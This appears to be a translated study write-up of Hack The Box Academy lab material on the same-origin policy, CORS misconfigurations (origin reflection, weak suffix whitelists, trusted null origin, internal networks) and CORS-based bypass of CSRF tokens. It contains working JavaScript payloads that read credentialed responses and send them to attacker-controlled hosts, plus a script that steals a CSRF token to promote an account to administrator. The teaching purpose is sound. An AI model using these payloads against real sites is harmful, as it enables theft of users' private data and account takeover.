<p>The Same Origin Policy is a security mechanism implemented in web browsers to prevent cross-origin access to websites. In particular, JavaScript code running on one source node cannot access another source node. This prevents malicious websites from stealing information from other sources and limits the types of requests they send to other sources.</p>
<p><code>origin</code> defined as URL<code>scheme</code>, <code>host</code>, and <code>port</code>. As long as two URLs differ in at least one of these three attributes, they are not of the same origin.</p>
<p>Two URLs<strong>same origin</strong>Three points must be met:</p>
<div class="post-table-wrap"><table><thead><tr><th>project</th><th>must be the same</th></tr></thead><tbody><tr><td>Protocol</td><td>http / https</td></tr><tr><td>Domain name (Host)</td><td>example.com</td></tr><tr><td>Port</td><td>80 / 443</td></tr></tbody></table></div>
<p>Given that the browser implements the same-origin policy, vulnerabilities and vulnerabilities in its software can lead to bypasses, potentially leading to high-severity security vulnerabilities.</p>
<p><strong>No same origin policy</strong></p>
<p>Suppose we have access to our private laptop <code>https://exploitationserver.htb</code> When accessing a malicious website, it executed the following JavaScript code:</p>
<pre><code class="language-html">&lt;script&gt;
    async function exfiltrate_data(url) {
        // get data
        const response = await fetch(url, {credentials: "include"});
        const data = await response.text();

        // exfiltrate data
        await fetch("https://attacker_system.htb/exfiltrate?c=" + btoa(data));
    }

    // exfiltrate mails
    exfiltrate_data("https://mymails.htb/getmails");

    // exfiltrate bank data
    exfiltrate_data("https://mybank.htb/myaccounts");

    // exfiltrate internal service
    exfiltrate_data("https://192.168.178.5/");
&lt;/script&gt;</code></pre>
<p><code>https://exploitationserver.htb</code> The JavaScript code on sends three fetches to our browser <code>https://mymails.htb/getmails</code>、<code>https://mybank.htb/myaccounts</code> and <code>https://192.168.178.5/</code> access request. If we log into any of these websites, the browser may <code>SameSite</code> The setting of the cookie configuration sends a session cookie, allowing these requests to be authenticated. The JavaScript code then sends the response back to the attacker-controlled system <code>https: //attacker_system.htb/exfiltrate</code> to leak. In this way, run <code>https: //attacker_system.htb</code> An attacker can obtain the response to a three-way authentication GET request from our user account and gain access to our <code>https://mymails.htb</code> Email, bank information and account balance <code>https://mybank.htb</code>, and even visit the inside of our homes <code>https://192.168.178.5</code> A wiki on the web (this wiki is not public and can only be accessed via a local area network).</p>
<p>This is a serious security breach and there is nothing we can do to prevent it. The Same Origin Policy is specifically designed to alleviate this problem.</p>
<p><strong>Same-origin strategy adopted</strong></p>
<p>As mentioned above, the same-origin policy blocks access across origins. In the above case, due to different hosts, the malicious website attacked <code>https://exploitationserver.htb</code> The source is different from all three sources. Therefore, calling a different source <code>fetch</code> Will trigger an error in the browser caused by the same-origin policy,<code>https://exploitationserver.htb</code> Unable to access and steal data:</p>
<img alt="Pasted image 20260415054310" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054310.png"/>
<p>Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note <code>Origin</code> and <code>Referer</code> header, indicating that this is indeed a cross-origin request: Understanding Same Origin Policy Blocking<a href="https://exploitationserver.htb/" rel="noreferrer" target="_blank">https://exploitationserver.htb</a> Accessing responses to cross-origin requests is critical. The (possibly authenticated) request itself is still sent. We can confirm this in Burp. please note <code>Origin</code> and <code>Referer</code> header, indicating that this is indeed a cross-origin request:</p>
<img alt="Pasted image 20260415054341" src="assets/posts/advanced-xss-csrf/Pasted image 20260415054341.png"/>
<p>This behavior can lead to CSRF attacks because the request will not be persisted.</p>
<p>There are some exceptions to the same-origin policy. For example, we could add something like <code>img</code>、 <code>video</code> and <code>script</code> Tags and other resources. For example, we can still include Hack The Box Academy's logo on a website we own using the following HTML code, even though it is loaded as cross-origin:</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;body&gt;
        &lt;script&gt;
            var img = document.createElement("img");
            img.setAttribute("src", "https://academy.hackthebox.com/images/logo.svg");
            document.body.appendChild(img);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;</code></pre>
<h3>CORS cross-origin resource sharing</h3>
<p>Cross-Origin Resource Sharing (CORS) is a W3C standard that defines exceptions to the same-origin policy. It enables the origin zone to define trusted origin zones and a list of HTTP methods that are allowed for cross-zone access.</p>
<p>To understand why CORS is needed, let’s assume a common real-life scenario: a server hosted on <code>http://vulnerablesite.htb</code> The web application displays the data. For this purpose, it is hosted with <code>http://api.vulnerablesite.htb</code> API communication on. More specifically, run <code>at http://vulnerablesite.htb</code> The application on contains only front-end code, responsible for getting data from the API. The API implements a simple REST API consisting of endpoints for creating, reading, updating, and deleting data.</p>
<p>This makes front-end web applications simple without having to deal with data-related logic. In particular, the front-end code handles interaction with the API and can use JavaScript code like the following, so all data is fetched once the website loads:</p>
<pre><code class="language-javascript">// fetch data
fetch("http://api.vulnerablesite.htb/data", {
    method: "GET"
}).then((response) =&gt; {
    return response.json();
}).then((data) =&gt; {
    // add to DOM
    &lt;SNIP&gt;
})
</code></pre>
<p>However, as mentioned above, this violates the Same Origin Policy because <code>http://vulnerablesite.htb</code> and <code>http://api.vulnerablesite.htb</code> are different sources. Therefore, the above JavaScript code causes an error and the data is not loaded correctly:</p>
<img alt="Pasted image 20260415055130" src="assets/posts/advanced-xss-csrf/Pasted image 20260415055130.png"/>
<p>Now, let’s discuss how CORS works and how web applications can communicate with APIs without getting caught by the Same Origin Policy error.</p>
<p><strong>How CORS works</strong></p>
<p>The server can configure exceptions for the same-origin policy through CORS by setting any of the following CORS headers in the HTTP response:</p>
<p>If the server also wants JS to read other response headers, it must use this field to expose them explicitly.</p>
<p>In other words, during this period, the browser does not need to resend OPTIONS preflight every time.</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin" rel="noreferrer" target="_blank">Access-Control-Allow-Origin</a>: Which origin (Origin) is allowed to read the current response</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Expose-Headers" rel="noreferrer" target="_blank">Access-Control-Expose-Headers</a>: By default, front-end JS is included in cross-origin responses<strong>Only a few "simple response headers" can be read</strong>.</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Methods" rel="noreferrer" target="_blank">Access-Control-Allow-Methods</a>: This header is mainly used for<strong>preflight request</strong> In the response, tell the browser: Which HTTP methods are allowed for this cross-origin resource</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Headers" rel="noreferrer" target="_blank">Access-Control-Allow-Headers</a>: This header is also used for<strong>preflight response</strong>, tell the browser: which request headers are allowed in front-end cross-domain requests</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials" rel="noreferrer" target="_blank">Access-Control-Allow-Credentials</a>: Whether to allow cross-domain requests to carry credentials and let the front-end JS read the response</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Max-Age" rel="noreferrer" target="_blank">Access-Control-Max-Age</a>: It tells the browser: How long can the result of this preflight request be cached?</li></ul>
<div class="post-table-wrap"><table><thead><tr><th>head</th><th>function</th></tr></thead><tbody><tr><td><code>Access-Control-Allow-Origin</code></td><td>Which source is allowed to read the response</td></tr><tr><td><code>Access-Control-Expose-Headers</code></td><td>Which additional response headers are allowed to be read by the front end</td></tr><tr><td><code>Access-Control-Allow-Methods</code></td><td>Which HTTP methods are allowed across domains</td></tr><tr><td><code>Access-Control-Allow-Headers</code></td><td>Which request headers are allowed for cross-domain requests?</td></tr><tr><td><code>Access-Control-Allow-Credentials</code></td><td>Whether to allow credentials such as cookies/Authorization and read the response</td></tr><tr><td><code>Access-Control-Max-Age</code></td><td>How long are preflight results cached?</td></tr></tbody></table></div>
<p><strong>Preflight Requests</strong></p>
<p>All that does not belong to <code>simple request</code> A conditional request is called <code>preflight request</code>. Before sending these cross-origin requests, the browser sends a request containing all the parameters of the actual cross-origin request to the different origins.<code>preflight request</code>. This enables the web server to decide whether to allow cross-origin requests. The browser waits for a response to the preflight request and only proceeds to send the actual cross-start request when the web server responds to the preflight request by setting the appropriate CORS header. Since the browser asks the web server for permission before sending the actual cross-origin request, CSRF vulnerabilities cannot exist in preflight requests.</p>
<p>A preflight check request is a request containing the following headers <code>OPTIONS</code> Request:</p>
<p>Access-Control-Request-Method: Tells the server the HTTP method used in the actual request.</p>
<p>Access-Control-Request-Headers: Informs the server of the HTTP headers used in the actual request</p>
<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Method" rel="noreferrer" target="_blank">Access-Control-Request-Method</a>: inform the server about the HTTP method used in the actual request</li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Request-Headers" rel="noreferrer" target="_blank">Access-Control-Request-Headers</a>: inform the server about the HTTP headers used in the actual request</li></ul>
<p>For example, if the API needs to accept JSON data in a POST request from a web application, a simple request is not enough because the Content-Type is set to <code>application/json</code>, which is not allowed in simple requests. Therefore, the browser sends a preflight request before sending the actual request. The API needs to set CORS response headers accordingly to notify the browser to allow cross-origin requests. More specifically, the original <code>http://vulnerablesite.htb</code>、<code>POST</code> methods and headers <code>Content-Type</code>.</p>
<p>After correctly configuring the CORS header, web applications and APIs can communicate with each other and avoid same-origin policy issues. Suppose the user wants to create a new data item via a POST request; the user's browser will first send a check-before-check request to check whether the API allows potentially dangerous cross-origin requests:</p>
<img alt="Pasted image 20260415064528" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064528.png"/>
<p>Since the response contains the correct CORS headers, the browser knows that the API allows preflight requests; therefore, it continues sending:</p>
<img alt="Pasted image 20260415064539" src="assets/posts/advanced-xss-csrf/Pasted image 20260415064539.png"/>
<p>Since the request also contains a CORS header with the origin of the request, the browser adds an exception in the same-origin policy, allowing the web application to access the response (in this case <code>success</code> response).</p>
<p>To enable updating data <code>PUT</code> Requests and for deletion of data <code>DELETE</code> Requests that the API must adjust in response to preflight requests <code>Access-Control-Allow-Methods</code> CORS header to include all allowed methods.</p>
<p>Just request<strong>Not a simple request</strong>(For example, using JSON, PUT, DELETE, and custom headers), the browser will first send one:</p>
<ol><li>What is a preflight request</li></ol>
<pre><code>OPTIONS request</code></pre>
<p>👉 This is the preflight request</p>
<p>The browser first asks the server:</p>
<ol><li>What is the preflight request asking?</li></ol>
<pre><code>May I send a cross-origin request?
May I use POST or PUT?
May I include Content-Type or custom headers?</code></pre>
<p>Corresponding request header:</p>
<pre><code>Access-Control-Request-Method  
Access-Control-Request-Headers</code></pre>
<ol><li>How does the server respond?</li></ol>
<p>If allowed by the server, it will return:</p>
<pre><code>Access-Control-Allow-Origin  
Access-Control-Allow-Methods  
Access-Control-Allow-Headers</code></pre>
<p>👉 Equivalent to saying:</p>
<pre><code>Yes, this request is allowed.</code></pre>
<h2>Misconfiguration</h2>
<p>Before we dive into CORS misconfiguration, let’s discuss possible attack vectors that CORS misconfiguration presents. Most attacks require the <code>Access-Control-Allow-Credentials</code> Header is set to <code>true</code>, thereby obtaining the authentication request in the context of the victim. If a CORS misconfiguration causes an attacker-controlled domain to obtain an exception to the Same Origin Policy, the resulting vulnerability is similar to a CSRF vulnerability, but more severe. Exceptions to the Same Origin Policy allow attacker-controlled domains to access responses to cross-origin requests. Since the request comes from an authentication context, the response contains sensitive information that an attacker could access and steal. Additionally, depending on the specific CORS configuration, it is possible for an attacker to interact with the web application, impersonate the victim and perform actions on their behalf.</p>
<p>If access is not set up <code>Access-Control-Allow-Credentials</code> ) header, the attacker will be unable to proceed with these attacks. However, misconfiguration of CORS in internal web applications could allow attackers to steal non-public information.</p>
<blockquote><strong>Note:</strong> Successfully exploiting some of the following CORS misconfigurations may require setting session cookies in real-world web applications <code>SameSite=None</code> properties.</blockquote>
<h3>Any Origin reflection</h3>
<p>The <code>Access-Control-Allow-Origin</code> The header contains the origin, allowing the same-origin policy to be bypassed, so the browser allows the origin node to access the response. Additionally, the header can be set to a wildcard (<code>*</code>), which causes all origins to obtain same-origin policy bypass. However, for security reasons, this feature cannot be used with <code>Access-Control-Allow-Credentials: true</code> True header merging, i.e. wildcards can only be used without credentials.</p>
<blockquote><strong>Note:</strong> A combination of original site and wildcard characters, such as <code>https: //*.cors-misconfigs.htb</code>, is invalid.</blockquote>
<p>However, some web applications need to allow credentials from multiple sources. For example, imagine a run <code>at https://cors-misconfigs.htb</code> The web application requires authentication and is used by multiple domains such as <code>https://site1.cors-misconfigs.htb</code> and <code>https://site2.cors-misconfigs.htb</code>) use. To achieve this, the web application may read the requested <code>Origin</code> header, and in the response <code>Access-Control-Allow-Origin</code> reflected in the head. This effectively results in a wildcard origin with <code>Access-Control-Allow-Credentials: true</code> The scenario for head binding is the same, but not explicitly prevented by the CORS standard.</p>
<p>In order to identify CORS misconfigurations that reflect any origin, we need to look for web applications that <code>Access-Control-Allow-Origin</code>) header is set to the original <code>origin</code> An instance that receives the value in the header. We can then send the corresponding request to Burp Repeater and modify the Origin header to a false value, such as <code>thisdoesnnotexist.whatever.htb</code>, and check if the domain is contained in <code>Access-Control-Allow-Origin</code> in the response header. If so, the web application will encounter this CORS configuration error.</p>
<p>① Attacker website:</p>
<pre><code>evil.com</code></pre>
<p>② Send a request:</p>
<pre><code>Origin: http://evil.com  
Cookie: your_login_cookie</code></pre>
<p>③ Server misconfiguration (critical)</p>
<pre><code>Access-Control-Allow-Origin: http://evil.com  
Access-Control-Allow-Credentials: true</code></pre>
<p>④ Browser behavior (core)</p>
<pre><code>The browser sees that the server allows evil.com to read the data.
→ The browser no longer blocks the response.</code></pre>
<p>⑤ Result</p>
<pre><code>JavaScript on evil.com can read the response body.</code></pre>
<p>Core differences (must be memorized)</p>
<pre><code>Normal behavior: the request can be sent, but the response cannot be read.
Vulnerable behavior: the request can be sent, and the response can be read.</code></pre>
<p>One more key point (which many people ignore) must be present at the same time:</p>
<pre><code>Access-Control-Allow-Credentials: true</code></pre>
<p>Otherwise:</p>
<pre><code>No cookies are sent → user data cannot be retrieved → impact is much lower.</code></pre>
<p><strong>Exploitation</strong> To exploit this, an attacker could host a similar payload on their web server, with an arbitrary starting point, e.g.<code>https://exploitserver.htb/exploit</code>: </p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    # 1. Bring the victim cookie
	# 2. Send cross-domain requests
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        # JS sends data to attacker server
        exfil.open('POST', 'https://10.10.14.45:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        # The browser allows JS to read data (core)
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>Suppose the victim is <code>https://exploitserver.htb/exploit</code> Navigate to the payload while the browser is at <code>https://cors-misconfigs.htb</code> Valid credentials for a misconfigured web application are stored. In this case, due to an insecure CORS configuration, data was accessed from the victim's valid session and exfiltrated to the attacker.</p>
<p>After visiting the website hosting the payload, the victim's browser will <code>https://cors-misconfigs.htb/data.php</code> Send a cross-origin request with credentials, a session cookie:</p>
<img alt="Pasted image 20260415070804" src="assets/posts/advanced-xss-csrf/Pasted image 20260415070804.png"/>
<p>Since the response reflects the origin in the CORS header and allows credentials, the attacker's origin <code>https://exploitserver.htb</code> An exception to the Same Origin Policy will be granted. As a result, the payload code was allowed to access the response and exfiltrate it by sending it to the attacker's HTTPS exfiltration server:</p>
<pre><code>Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/)...
10.10.14.144 - - [30/Nov/2025 12:04:04] "OPTIONS /log HTTP/1.1" 200 -
10.10.14.144 - - [30/Nov/2025 12:04:04] [i] POST body: {"data":"CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo="}
10.10.14.144 - - [30/Nov/2025 12:04:04] "POST /log HTTP/1.1" 200 -</code></pre>
<p>After base64 decoding the stolen data, we get the HTML page:</p>
<pre><code class="language-shellsession">Chenduoduo@htb[/htb]$ echo -n CjxodG1sPgo8aGVhZD5IZWxsbyBXb3JsZCE8L2hlYWQ+Cjxib2R5PjxkaXYgaWQ9InNlY3JldCI+VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdlLjwvZGl2PjwvYm9keT4KPC9odG1sPgo= | base64 -d

&lt;html&gt;
&lt;head&gt;Hello World!&lt;/head&gt;
&lt;body&gt;&lt;div id="secret"&gt;This is a secret message.&lt;/div&gt;&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>Therefore, this CORS misconfiguration allows an attacker without valid credentials to access data in the API, despite the API being protected by authentication.</p>
<p>In other words, the attacker induces the victim to visit the target website by himself through the payload on his malicious website, and then sends the content or data of the target website to the malicious website.</p>
<h3>Inappropriate source whitelist</h3>
<p><strong>Background background</strong></p>
<p>Web applications must reflect trusted sources against a whitelist of origins, rather than reflecting arbitrary origins. If the check is not done properly, an attacker could bypass it and implement same-origin exceptions for untrusted sources. In particular, implementations that check origin prefixes or suffixes may be vulnerable.</p>
<p>A common goal for web applications is to trust all subdomains of a certain origin. For example, assuming it's hosted on <code>https://cors-misconfigs.htb</code> The API does this by checking if the source header ends with a string <code>cors-misconfigs.htb</code> End with the Validate Origin header to verify that only sibling subdomains are granted Same Origin Policy exceptions. While the API checks the source before trusting it, this check is poorly implemented because it not only overrides <code>the cors-misconfigs.htb</code> subdomains, and also covers all <code>cors-misconfigs.htb</code> ending domain name.</p>
<p><strong>Exploitation</strong> Exploiting this CORS misconfiguration is the same as exploiting Arbitrary Origin Reflection (RNR), and an attacker can use the same payload to steal data. However, due to the detection of the origin, the attacker has limitations on where the payload originates. Due to the suffix matching, the attacker cannot use the original <code>https://exploitserver.htb</code> to take advantage of, but you can choose any <code>cors-misconfigs.htb</code> The origin of the ending, for example,<code>https://attackercors-misconfigs.htb</code> Hosting as a payload.</p>
<h3>Trust null Origin</h3>
<p><code>Access-Control-Allow-Origin</code> header not only supports trusted starting points and wildcards, but also supports representation <code>null origin</code> The value is empty. Although it should not be used in practice, some web applications may misunderstand its meaning. There are various methods an attacker can use to force a null origin for a cross-origin request, which is then trusted, creating a Same Origin Policy exception.</p>
<p><strong>Exploitation</strong></p>
<p>The attacker must provide in the cross-origin request <code>null</code> source to exploit this misconfiguration. Any origin can be achieved by using a sandboxed iframe:</p>
<pre><code class="language-html">&lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li><code>sandbox="allow-scripts allow-top-navigation allow-forms</code>, turn on sandbox mode, turn the iframe into a restricted environment, no <code>allow-same-origin</code>, the browser will set the origin of this iframe to <code>null</code>.</li></ul>
<p>Using this payload, the exploitation method is the same as the previous misconfiguration. However, sandboxing iframes causes cross-origin requests to be <code>null</code>: </p>
<img alt="Pasted image 20260415174331" src="assets/posts/advanced-xss-csrf/Pasted image 20260415174331.png"/>
<h3>Target local network</h3>
<p><strong>Background background</strong></p>
<p>Even if the web application is not configured with CORS allowed credentials, attackers may still be able to target web applications that are not publicly accessible on the local network running behind a firewall, reverse proxy, or NAT. If these internal web applications do not require authentication and contain CORS misconfigurations that trust the attacker's origin, data theft may be possible.</p>
<p>If authentication is not required, access is not required <code>Access-Control-Allow-Credentials</code> CORS header. Therefore, in addition to the CORS misconfigurations discussed so far, wildcard origins can lead to misconfigurations that can be exploited in these cases. For example, suppose an internal API that does not require authentication is hosted on <code>https://172.16.0.2</code>. Additionally, the API is <code>Access-Control-Allow-Origin</code> Set a wildcard so all origins are trusted.</p>
<p><strong>Exploitation</strong> The only protection the API has is that it can only be accessed from within the internal network; however, wildcard origin allows any attacker-controlled origin to steal data while the victim has access. Since no authentication is required, we do not need to set it in the payload <code>withCredentials</code> Options:</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://172.16.0.2/data.php', true);
    xhr.onload = () =&gt; {
        var exfil = new XMLHttpRequest();
        exfil.open('POST', 'https://10.10.14.144:4443/log', true);
        exfil.setRequestHeader('Content-Type', 'application/json');
        exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>It is assumed that the victim opening the payload is on the same internal network as the internal API and therefore has access to the API. In this case, the victim's browser makes a cross-origin request within the internal network:</p>
<img alt="Pasted image 20260415180612" src="assets/posts/advanced-xss-csrf/Pasted image 20260415180612.png"/>
<p>The response is then leaked to the attacker, allowing the theft of web application data that is not publicly accessible.</p>
<p>Additionally, an attacker does not need to know the IP address and port the misconfigured application is running on, but can increase the load on internal network scans by trying to request different IP address and port combinations until the application is found.</p>
<p>Note that we can simplify the payload by using a GET request for the evacuation instead of a POST, which looks like the following:</p>
<pre><code class="language-html">&lt;script&gt;
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://cors-misconfigs.htb/data.php', true);
    xhr.withCredentials = true;
    xhr.onload = () =&gt; {
        location = 'https://10.10.14.144:4443/log?data=' + btoa(xhr.responseText);
    };
    xhr.send();
&lt;/script&gt;</code></pre>
<p>However, there are drawbacks to using GET requests for data theft. First, control <code>location</code> This results in a redirect, making the XSS attack obvious to the victim because the website displayed in their browser changes. So in the background use <code>fetch</code> or <code>XMLHttpRequest</code> By initiating a filtering request, the operational security effect is significantly better. Secondly, URL length is not unlimited. Therefore, if the data we are trying to exfiltrate is too large, the payload may fail.</p>
<h2>Bypassing CSRF Token via CORS misconfiguration</h2>
<p>In addition to the previously mentioned attack vectors, CORS misconfigurations can be exploited to bypass CSRF defenses and conduct a CSRF attack, even if appropriate defenses are in place.</p>
<p>If CORS is configured incorrectly so that the session cookie is sent at the same time as the cross-origin request, it is set <code>Access-Control-Allow-Credentials</code>, we can effectively bypass the same-origin policy. In this case, common CSRF defenses are ineffective, as we will discuss in this section.</p>
<h3>Defense bypass: CSRF Token</h3>
<p>If we can bypass the same-origin policy due to a CORS misconfiguration, we can access the responses to cross-origin requests we make. This allows us to send a cross-origin request to the endpoint that created a valid CSRF token, read that token, embed it in a state-changed cross-origin request, and send the state-changed cross-origin request with a valid CSRF token. Since all of this happens within the victim's session, the CSRF token is still valid even if properly inspected and bound to the victim's user session.</p>
<p>However, in order for the victim's browser to send the victim's session cookie along with the JavaScript request, we require that the vulnerable web application explicitly <code>SameSite</code> The cookie attribute is set to <code>null</code>, in addition to handling CORS configuration errors. According to the spec, this is only allowed via <code>secure</code> Cookie attribute transfer, which only implements cookie transfer over a secure HTTPS connection. Cookies are not sent over any unencrypted HTTP connection.</p>
<p>Due to this limitation, the sample web app and all other lab components are only accessible via HTTPS. If we analyze the web application, we can notice that the application sets <code>Access-Control-Allow-Origin</code> and <code>Access-Control-Allow-Credentials</code> CORS header indicating that we should check for CORS configuration errors. Additionally, the session cookie is set at the same time <code>Secure</code> and <code>SameSite=None</code> These two cookie properties:</p>
<img alt="Pasted image 20260415185929" src="assets/posts/advanced-xss-csrf/Pasted image 20260415185929.png"/>
<p>We can analyze the HTTP<code>Origin</code> Response to different values of the head. If we provide an arbitrary value, we can see that the web application is indeed misconfigured because the arbitrary origin is reflected in <code>Access-Control-Allow-Origin</code> The CORS header:</p>
<img alt="Pasted image 20260415190236" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190236.png"/>
<p>we can use <code>SameSite=None</code> The cookie attribute exploits CORS misconfiguration to bypass proper CSRF protection and conduct a CSRF attack. Let’s further analyze the web application to identify potential targets for this attack.</p>
<p>As before, the web application implements the ability to promote user accounts to administrators. This time, the corresponding POST request is properly protected by the CSRF token:</p>
<img alt="Pasted image 20260415190439" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190439.png"/>
<p>We wrote an exploit that obtained a valid CSRF token in the victim's session and then made the corresponding cross-origin request, forcing the victim to elevate our user account to administrator privileges. The CSRF token is the response to <code>/profile.php</code> GET request sent by the endpoint. We can make the appropriate request, parse the response, and extract the CSRF token using JavaScript code like the following:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);</code></pre>
<p>Afterwards, we can build a cross-origin request to promote our users with a valid CSRF token:</p>
<pre><code class="language-js">var csrf_req = new XMLHttpRequest();
var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>We can combine these two parts to get the following payload on our vulnerable server:</p>
<pre><code class="language-html">&lt;script&gt;
    // GET CSRF token
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bypassing-csrftokens.htb/profile.php', false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

    // do CSRF
    var csrf_req = new XMLHttpRequest();
    var params = \`promote=htb-stdnt&amp;csrf=\${csrftoken}\`;
    csrf_req.open('POST', 'https://bypassing-csrftokens.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;</code></pre>
<p>If we look at the exploit, we can see an authenticated GET request made to <code>/profile.php</code>, followed by <code>profile.php</code> An authenticated POST request with a valid CSRF token. Therefore, our exploit should work. After delivering the email to the victim and waiting a few seconds, our user was promoted to administrator. Therefore, we successfully exploited the CORS misconfiguration to bypass the CSRF protection and successfully conduct a CSRF attack:</p>
<img alt="Pasted image 20260415190555" src="assets/posts/advanced-xss-csrf/Pasted image 20260415190555.png"/>
<p>Elevate permissions directly on the login page</p>
<img alt="Pasted image 20260415194750" src="assets/posts/advanced-xss-csrf/Pasted image 20260415194750.png"/>
<pre><code>POST /login.php HTTP/1.1

Host: bypassing-csrftokens.htb

Content-Length: 42

Content-Type: application/x-www-form-urlencoded



user=htb-stdnt&amp;password=Academy_student%21</code></pre>
<p>Use the following to send to the target website</p>
<pre><code class="language-js">&lt;iframe sandbox="allow-scripts allow-forms"
src="data:text/html,&lt;script&gt;
var x=new XMLHttpRequest();
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
x.withCredentials=true;
x.send();

var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<ul><li>Server allows <code>Origin:null</code>, so set it to sandbox to put this subpage in an isolated environment.</li></ul>
<pre><code class="language-js"># The server allows \`Origin:null\`, so set it to sandbox to put this subpage in an isolated environment.
&lt;iframe sandbox="allow-scripts allow-forms"

# Inline a "page" and directly execute the JS inside
src="data:text/html,&lt;script&gt;

# Get CSRF Token
var x=new XMLHttpRequest();
# false, synchronous request (make sure you can get the response in the next step)
x.open('GET','https://bypassing-csrftokens.htb/profile.php',false);
# Bring the cookie of the victim (admin)
x.withCredentials=true;
x.send();

# Convert the returned HTML into DOM and extract from it: &lt;input id="csrf_token" value="xxxx"&gt;
var d=new DOMParser().parseFromString(x.responseText,'text/html');
var t=encodeURIComponent(d.getElementById('csrf_token').value);

# Initiate CSRF privilege escalation
var r=new XMLHttpRequest();
r.open('POST','https://bypassing-csrftokens.htb/profile.php',false);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.withCredentials=true;
r.send('promote=htb-stdnt&amp;csrf_token='+t);
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<blockquote>The admin browser is controlled by JS and automatically executes the privilege escalation request.</blockquote>
<blockquote>Let the remote admin browser help us upgrade our account to admin permissions</blockquote>
<h2>Other CSRF exploits</h2>
<h3>Combining attack vectors to bypass SameSite Cookie</h3>
<p>The web browser determines the origin of the request <code>site</code>  and destination, which determines whether to send the SameSite cookie. This is consistent with the same-origin policy considerations mentioned a few sections ago.<code>origin</code> Different. The key difference is that ports and subdomains are not considered part of the website. Therefore, even if the port and subdomain name are different, the two domain names are still considered the same site, and in some cases, cross-origin requests are still considered the same site. Consider the following example:</p>
<ul><li><code>https://vulnerable.htb</code> and <code>https://sub.vulnerable.htb</code> All SameSite</li><li><code>https://vulnerable.htb</code> and <code>https://vulnerable.htb:9001</code> It's all SameSite.</li><li><code>https://vulnerable.htb</code> and <code>https://sub.vulnerable.htb:9001</code> All SameSite</li></ul>
<ul><li><code>http://vulnerable.htb</code> and <code>https://vulnerable.htb</code> None of them are SameSite.</li><li><code>https://vulnerable.htb</code> and <code>https://exploitserver.htb</code> _Not_ SameSite.</li></ul>
